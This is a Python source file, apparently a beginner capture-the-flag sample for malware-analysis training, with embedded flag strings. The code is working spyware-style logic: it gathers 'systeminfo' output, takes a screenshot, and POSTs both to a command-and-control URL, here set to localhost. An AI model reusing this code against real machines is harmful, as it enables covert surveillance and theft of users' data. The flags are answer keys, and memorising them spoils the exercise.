'''
This python file was written as a simple Level1 CTF for malware analysis by Yuri Rozhansky @ FireEye.
It is designed to be used with PyInstaller.

You may use it freely, as long as you give credit.

This code may be buggy, poorly written etc. You may improve it and change it.
You *may not* use this code for evil. Frankly - if you want to do evil, write better code.
'''
import os
import pyautogui
import requests

debug = 0

def dbgprint(text):
    if debug:
        print text


class Config:
    def __init__(self, output_path="TEMP", c2="http://127.0.0.1/V3ryBadUrl"):
        self.outputDir = os.environ.get(output_path)
        dbgprint(self.outputDir)
        self.c2 = c2
        self.Flag1 = "Flag_IPwn3dY0urSys"
        self.Flag2 = "Flag_A1lYourScr33nAr3Bel0ng2Me"
        self.FlagBonus = "Flag_Sn3akyStr1ngs!"

class Collector:
    def __init__(self):
        self.dirlist = []
        self.config = Config()
        self.sysinfo = ""
        self.pic = ""

    def get_sysinfo(self):
        if not os.path.exists(self.config.outputDir):
            os.makedirs(self.config.outputDir)
        out = os.system("cmd /c systeminfo > " + os.path.join(self.config.outputDir, "tmp") + " 2>&1")
        f = open(os.path.join(self.config.outputDir, "tmp"))
        info = f.read()
        self.sysinfo = info
        dbgprint(self.sysinfo)
        f.close()
        os.remove(os.path.join(self.config.outputDir, "tmp"))
        return info

    def make_sysinfo_file(self, fileName):
        if not os.path.exists(self.config.outputDir):
            os.makedirs(self.config.outputDir)
        if not os.path.exists(os.path.join(self.config.outputDir, fileName)):
            sysfile = open(os.path.join(self.config.outputDir, fileName), "wb")
        else:
            os.remove(os.path.join(self.config.outputDir, fileName))
            sysfile = open(os.path.join(self.config.outputDir, fileName), "wb")
        sysfile.write(self.config.Flag1 + "\r\n" + self.sysinfo)
        sysfile.close()

    def get_printscreen(self):
        pic = pyautogui.screenshot()
        pic.save(os.path.join(self.config.outputDir, self.config.Flag2 + ".jpg"))
        f = open(os.path.join(self.config.outputDir, self.config.Flag2 + ".jpg"), "rb")
        pic = f.read()
        self.pic = pic.encode('base64')
        f.close()
        dbgprint(self.pic)
        os.remove(os.path.join(self.config.outputDir, self.config.Flag2 + ".jpg"))
        return self.pic

    def sendData(self):
        data = self.sysinfo + "++++" + self.pic
        try:
            req = requests.post(self.config.c2, data)
        except Exception:
            exit(1)


def main():
    print "Welcome to this CTF! You job is to find 2 secret Flags (words starting with Flag_)! \r\nA third flag exists as extra bonus."
    collector = Collector()
    collector.get_sysinfo()
    collector.make_sysinfo_file("ctf1.tmp")
    collector.get_printscreen()
    collector.sendData()

if __name__ == "__main__":
    main()
